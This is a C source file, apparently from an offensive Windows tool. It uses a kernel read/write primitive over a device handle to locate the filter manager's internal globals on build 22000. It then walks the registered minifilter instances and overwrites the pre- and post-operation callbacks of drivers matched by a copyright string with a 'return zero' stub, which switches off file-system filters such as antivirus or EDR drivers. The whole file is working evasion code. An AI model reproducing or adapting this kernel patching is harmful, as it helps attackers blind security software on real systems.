#include "struct.h"


/*
* 3: kd> dt fltMgr!_FLT_FILTER
   +0x000 Base             : _FLT_OBJECT
   +0x030 Frame            : Ptr64 _FLTP_FRAME
   +0x038 Name             : _UNICODE_STRING
   +0x048 DefaultAltitude  : _UNICODE_STRING
   +0x058 Flags            : _FLT_FILTER_FLAGS
   +0x060 DriverObject     : Ptr64 _DRIVER_OBJECT
   +0x068 InstanceList     : _FLT_RESOURCE_LIST_HEAD
   +0x0e8 VerifierExtension : Ptr64 _FLT_VERIFIER_EXTENSION
   +0x0f0 VerifiedFiltersLink : _LIST_ENTRY
   +0x100 FilterUnload     : Ptr64     long 
   +0x108 InstanceSetup    : Ptr64     long 
   +0x110 InstanceQueryTeardown : Ptr64     long 
   +0x118 InstanceTeardownStart : Ptr64     void 
   +0x120 InstanceTeardownComplete : Ptr64     void 
   +0x128 SupportedContextsListHead : Ptr64 _ALLOCATE_CONTEXT_HEADER
   +0x130 SupportedContexts : [7] Ptr64 _ALLOCATE_CONTEXT_HEADER
   +0x168 PreVolumeMount   : Ptr64     _FLT_PREOP_CALLBACK_STATUS 
   +0x170 PostVolumeMount  : Ptr64     _FLT_POSTOP_CALLBACK_STATUS 
   +0x178 GenerateFileName : Ptr64     long 
   +0x180 NormalizeNameComponent : Ptr64     long 
   +0x188 NormalizeNameComponentEx : Ptr64     long 
   +0x190 NormalizeContextCleanup : Ptr64     void 
   +0x198 KtmNotification  : Ptr64     long 
   +0x1a0 SectionNotification : Ptr64     long 
   +0x1a8 Operations       : Ptr64 _FLT_OPERATION_REGISTRATION
   +0x1b0 OldDriverUnload  : Ptr64     void 
   +0x1b8 ActiveOpens      : _FLT_MUTEX_LIST_HEAD
   +0x208 ConnectionList   : _FLT_MUTEX_LIST_HEAD
   +0x258 PortList         : _FLT_MUTEX_LIST_HEAD
   +0x2a8 PortLock         : _EX_PUSH_LOCK_AUTO_EXPAND

*/
UCHAR PTRN_WIN10_MINIFILTER[] = { 0x57,0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57 };
void InitMiniFilter(PINFORMATION pInfor)
{
	switch (pInfor->Build)
	{
	case 22000:
		pInfor->Notify.ModuleName = "fltMgr.sys";
		pInfor->Notify.Pattern = PTRN_WIN10_MINIFILTER;
		pInfor->Notify.dwPattern = sizeof(PTRN_WIN10_MINIFILTER);
		pInfor->Notify.offset = 61;
		pInfor->Notify.startFunc = "FltEnumerateFilters";
		pInfor->Notify.endFunc = "FltEnumerateInstanceInformationByFilter";
		pInfor->MiniFilter.MiniFilterGlobalOffset = 0xa8; // lea     r12,[r15+0A8h]
		pInfor->MiniFilter.InstanceListOffset = 0x68;
		pInfor->MiniFilter.rListOffset = 0x68;
		pInfor->MiniFilter.rCountOffset = 0x78;
		pInfor->MiniFilter.portOffset = 0x10;
		pInfor->MiniFilter.InstanceOffset = 0x70; //and rsi, 0FFFFFFFFFFFFFFA0h; and rsi 70h ... sub r12, rsi
		pInfor->MiniFilter.CallbackOffset = 0x90;
		pInfor->MiniFilter.CallbackPreOffset = 0x18;
		pInfor->MiniFilter.CallbackPostOffset = 0x20;
		break;
	default:
		break;
	}
}
BOOL EnumInstances(PINFORMATION pInfor, ULONG_PTR InstanceList,PWSTR Copyright)
{
	BOOL status = FALSE;
	ULONG_PTR ListStart;
	ULONG_PTR rCount = 0;
	DWORD Count = 0;
	ULONG_PTR pCallBack, preCallBack, postCallBack, Instance;
	ULONG k;
	ULONG_PTR func;
	UCHAR ret[] = { 0x33,0xc0,0xc3,0x90,0x90,0x90,0x90,0x90 };

	if (UtilReadKernelMemory(pInfor->hDevice, InstanceList + pInfor->MiniFilter.rCountOffset, &rCount) && rCount)
	{
		Count = (DWORD)(rCount & 0xFFFFFFFF);
		ListStart = InstanceList + pInfor->MiniFilter.rListOffset;
		while (Count)
		{
			UtilReadKernelMemory(pInfor->hDevice, ListStart, &ListStart);
			Instance = ListStart - pInfor->MiniFilter.InstanceOffset;
			//wprintf(L"\t%I64X\n", Instance);
			for (k = 0x16; (k < 0x32) && !status; k++)
			{
				UtilReadKernelMemory(pInfor->hDevice, Instance + pInfor->MiniFilter.CallbackOffset + (sizeof(PVOID) * k), &pCallBack);
				if (pCallBack)
				{
					wprintf(L"\tCallBack @ %I64X\n", pCallBack);
					UtilReadKernelMemory(pInfor->hDevice, pCallBack + pInfor->MiniFilter.CallbackPreOffset, &preCallBack);
					UtilReadKernelMemory(pInfor->hDevice, pCallBack + pInfor->MiniFilter.CallbackPostOffset, &postCallBack);
					if ((preCallBack || postCallBack) /* && (k == 0x16)*/) //just delete CREATE 
					{
						if (preCallBack)
						{
							if (checkDriver(pInfor->hDevice, 0, preCallBack, Copyright, NULL, FALSE))
							{
								wprintf(L"\t\tPre @ %I64X\n", preCallBack);
								UtilReadKernelMemory(pInfor->hDevice, preCallBack, &func);
								RtlCopyMemory(&func, ret, sizeof(ret));
								UtilWriteKernelMemory(pInfor->hDevice, preCallBack, func);
							}

						}
						if(postCallBack)
						{
							if (checkDriver(pInfor->hDevice, 0, postCallBack, Copyright, NULL, FALSE))
							{
								wprintf(L"\t\tPost @ %I64X\n", postCallBack);
								UtilReadKernelMemory(pInfor->hDevice, postCallBack, &func);
								RtlCopyMemory(&func, ret, sizeof(ret));
								UtilWriteKernelMemory(pInfor->hDevice, postCallBack, func);
							}
						}
						//wprintf(L"\t\tPre @ %I64X\n\t\tPost @ %I64X\n", preCallBack, postCallBack);
					}
				}
			}
			Count--;

		}
	}

	return status;
}
void minifilter(PINFORMATION pInfor,PWSTR Copyright)
{
	NTSTATUS status;
	ULONG_PTR FltGlobals, ListEntry, pre;// , ListPre, ListPost;

	InitMiniFilter(pInfor);
	if (!moduleInfos)
	{
		status = enumDriver();
		if (!NT_SUCCESS(status))
		{
			PRINT_ERROR(L"enumDriver %08x\n", status);
			return;
		}
	}

	if (needSort)
		SortDevice();

	if (GetGlobalAddress(pInfor->Notify.ModuleName, pInfor->Notify.startFunc, pInfor->Notify.endFunc, pInfor->Notify.Pattern, pInfor->Notify.dwPattern, pInfor->Notify.offset, &FltGlobals))
	{
		wprintf(L"[*] FltGlobals @ %I64X\n", FltGlobals);
		if (UtilReadKernelMemory(pInfor->hDevice, FltGlobals, &ListEntry))
		{
	
			ListEntry = ListEntry + pInfor->MiniFilter.MiniFilterGlobalOffset;
			pre = ListEntry;
			do
			{
				UtilReadKernelMemory(pInfor->hDevice, pre, &pre);
				if (pre == ListEntry)
					break;
				wprintf(L"[*] MinifilterPort @ %I64X\n", pre - pInfor->MiniFilter.portOffset);
				if (EnumInstances(pInfor, pre - pInfor->MiniFilter.portOffset + pInfor->MiniFilter.InstanceListOffset, Copyright))
				{
					//UtilReadKernelMemory(pInfor->hDevice, pre, &ListPre);
					//UtilReadKernelMemory(pInfor->hDevice, pre + 8, &ListPost);
					//UtilWriteKernelMemory(pInfor->hDevice, ListPre + 8, ListPost);
					//UtilWriteKernelMemory(pInfor->hDevice, ListPost, ListPre);
				}
			} while (pre != ListEntry);
		}
	}
}

